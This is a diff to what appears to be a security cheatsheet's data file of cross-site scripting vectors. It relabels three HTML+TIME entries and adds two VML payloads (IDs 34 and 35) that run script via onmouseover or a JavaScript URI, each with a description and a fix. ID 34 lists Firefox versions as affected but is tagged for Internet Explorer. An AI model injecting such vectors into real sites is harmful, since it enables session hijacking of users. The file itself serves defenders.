@@ -481,7 +481,7 @@ var items =
     },
     { /* ID 16 - Using onbegin and HTML+TIME to execute JavaScript */
         'id'         : 16,
-        'category'   : 'htmlplustime', 
+        'category'   : 'behavior', 
         'name'       : {
             'en' : 'Using onbegin and HTML+TIME to execute JavaScript',
             'jp' : '',
@@ -724,7 +724,7 @@ var items =
     },
     { /* ID 24 - JavaScript execution via HTML+TIME without user interaction (2) */
         'id'         : 24,
-        'category'   : 'htmlplustime', 
+        'category'   : 'behavior', 
         'name'       : {
             'en' : 'JavaScript execution via HTML+TIME without user interaction (2)',
             'jp' : '',
@@ -842,7 +842,7 @@ var items =
     },
     { /* ID 28 - JavaScript execution via HTML+TIME without user interaction (1)  */
         'id'         : 28,
-        'category'   : 'htmlplustime', 
+        'category'   : 'behavior', 
         'name'       : {
             'en' : 'JavaScript execution via HTML+TIME without user interaction (1)',
             'jp' : '',
@@ -1024,5 +1024,63 @@ var items =
         },
         'tags'       : ['xss', 'hijacking', 'css', 'pointer-events', 'firefox'],
         'reporter'   : '.mario'
+    },
+    { /* ID 34 - VML frame with embedded VML object plus onmouseover  */
+        'id'         : 34,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'VML frame with embedded VML object plus onmouseover',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);width:100%;height:100%><xml><rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" /></xml></vmlframe>',
+        'description': {
+            'en' : 'A VML frame object is enclosing a VML rect object which is responding to mouseover events. The whole vector can also work by giving the VML frame a "src" attribute and have it point to another VML object. VML frames can also enclose regular HTML.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'firefox': ['3.6', '3.7'] 
+        },
+        'tags'       : ['xss', 'javascript', 'behavior', 'vml', 'internet explorer'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 35 - VML Line object utilizing href attribute with JavaScript URI   */
+        'id'         : 35,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'VML Line object utilizing href attribute with JavaScript URI',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=%js_uri_alert% strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
+        'description': {
+            'en' : 'The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
+        },
+        'tags'       : ['xss', 'javascript', 'behavior', 'vml', 'internet explorer'],
+        'reporter'   : 'LeverOne'
     }
 ]
